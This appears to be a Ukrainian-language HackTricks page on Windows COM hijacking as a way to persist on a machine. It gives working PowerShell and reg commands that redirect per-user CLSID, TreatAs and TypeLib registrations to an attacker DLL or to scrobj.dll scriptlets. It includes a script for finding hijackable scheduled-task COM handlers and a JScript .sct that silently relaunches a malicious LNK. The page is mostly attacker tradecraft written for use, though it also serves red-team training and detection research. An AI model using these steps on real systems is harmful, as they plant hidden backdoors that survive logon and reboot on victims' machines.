# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих COM-компонентів

Оскільки значення в HKCU можуть змінюватися користувачами, **COM Hijacking** може використовуватися як **механізм персистенції**. За допомогою `procmon` легко знайти запити до реєстру COM, які ще не існують і які може створити атакуючий. Класичні фільтри:

- **RegOpenKey** операції.
- де _Result_ — **NAME NOT FOUND**.
- і _Path_ закінчується на **InprocServer32**.

Корисні варіації під час пошуку:

- Також перевіряйте відсутні ключі **`LocalServer32`**. Деякі COM-класи — це сервери, що виконуються в окремому процесі, і вони запустять EXE, контрольований атакуючим, замість DLL.
- Шукайте операції реєстру **`TreatAs`** та **`ScriptletURL`** на додачу до `InprocServer32`. Нещодавні матеріали з виявлення та розбори malware звертають увагу на них, оскільки вони значно рідші за звичайні реєстрації COM і тому мають високу інформативність.
- Скопіюйте легітимний параметр **`ThreadingModel`** з оригінального запису `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`, коли клонуватимете реєстрацію до HKCU. Використання неправильного моделю часто ламає активацію і робить перехоплення більш помітним.
- На 64‑бітних системах перевіряйте як 64‑бітний, так і 32‑бітний вигляди (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` і `HKLM\Software\Classes\WOW6432Node`), оскільки 32‑бітні застосунки можуть використовувати іншу реєстрацію COM.

Коли ви вирішите, який неіснуючий COM імітувати, виконайте наступні команди. _Будьте обережні, якщо вирішите імітувати COM, який завантажується кожні кілька секунд — це може бути зайвим._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Перехоплювані компоненти Task Scheduler COM

Windows Tasks використовують Custom Triggers для виклику COM objects, і оскільки вони виконуються через Task Scheduler, простіше передбачити, коли вони будуть спрацьовувати.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Перевіряючи вивід, ви можете вибрати задачу, яка, наприклад, виконуватиметься **кожного разу, коли користувач входить у систему**.

Тепер, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** у **HKEY\CLASSES\ROOT\CLSID** та в HKLM і HKCU, ви зазвичай виявите, що значення відсутнє в HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Тоді ви можете просто створити запис у HKCU, і щоразу при вході користувача ваш backdoor запускатиметься.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` дозволяє одному CLSID емулюватися іншим. З точки зору нападника це означає, що ви можете залишити оригінальний CLSID без змін, створити другий пер-юзерний CLSID, який вказує на `scrobj.dll`, а потім перенаправити реальний COM-об'єкт на шкідливий через `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Це корисно коли:

- цільовий додаток вже створює стабільний CLSID під час входу в систему або при запуску додатку
- ви хочете перенаправлення тільки через реєстр замість заміни оригінального `InprocServer32`
- ви хочете виконати локальний або віддалений `.sct` scriptlet через значення `ScriptletURL`

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Примітки:

- `scrobj.dll` читає значення `ScriptletURL` і виконує вказаний `.sct`, тому ви можете зберігати payload як локальний файл або завантажувати його віддалено через HTTP/HTTPS.
- `TreatAs` особливо корисно, коли початкова реєстрація COM завершена й стабільна в HKLM, бо потрібно лише невелике перенаправлення для користувача замість дзеркалювання всього дерева.
- Для перевірки без очікування природного тригера ви можете вручну інстанціювати фейковий ProgID/CLSID за допомогою `rundll32.exe -sta <ProgID-or-CLSID>`, якщо цільовий клас підтримує STA activation.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) визначають COM-інтерфейси і завантажуються через `LoadTypeLib()`. Коли COM-сервер інстанціюється, ОС може також завантажити пов'язану TypeLib, звернувшись до ключів реєстру під `HKCR\TypeLib\{LIBID}`. Якщо шлях TypeLib замінено на **moniker**, наприклад `script:C:\...\evil.sct`, Windows виконає scriptlet під час вирішення TypeLib — створюючи приховану персистентність, яка спрацьовує, коли зачіпаються загальні компоненти.

Це спостерігалося щодо Microsoft Web Browser control (який часто завантажується Internet Explorer, додатками, що вбудовують WebBrowser, та навіть `explorer.exe`).

### Кроки (PowerShell)

1) Визначте TypeLib (LIBID), яку використовує CLSID з високою частотою викликів. Приклад CLSID, який часто використовують у malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Вкажіть шлях TypeLib для поточного користувача на локальний scriptlet, використовуючи моникер `script:` (права адміністратора не потрібні):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop мінімальний JScript `.sct`, який перезапускає ваш основний payload (наприклад, `.lnk`, що використовується початковим ланцюжком):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Спрацьовування – відкриття IE, програми, що вбудовує WebBrowser control, або навіть рутинна активність Explorer завантажить TypeLib і виконає scriptlet, заново активуючи ваш ланцюг при logon/reboot.

Очищення
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Примітки
- Ви можете застосувати ту ж логіку до інших часто використовуваних COM компонентів; завжди спочатку визначайте реальний `LIBID` з `HKCR\CLSID\{CLSID}\TypeLib`.
- У 64-розрядних системах ви також можете заповнити підключ `win64` для 64-розрядних споживачів.

## Джерела

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
